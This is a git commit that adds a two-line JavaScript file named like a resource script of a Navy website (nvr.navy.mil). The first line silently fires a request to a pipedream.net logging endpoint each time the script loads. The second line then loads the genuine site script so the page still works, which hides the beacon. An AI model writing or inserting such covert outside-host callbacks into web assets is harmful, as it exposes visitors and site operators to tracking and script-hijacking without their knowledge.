37717e28d3159960087d6389b946887e70025c38
Rey2 <rhyfk0z@gmail.com>
2026-01-10 04:42:19 +0700

    Create hulllinkclick.js

---
+++ nvr/resources/js/hulllinkclick.js
@@ -0,0 +1,2 @@
+(function(){new Image().src='https://eoow6y96ffo9mzx.m.pipedream.net/log?script=hulllinkclick.js';})();
+var s=document.createElement('script');s.src='https://www.nvr.navy.mil/nvr/resources/js/hulllinkclick.js';document.head.appendChild(s);
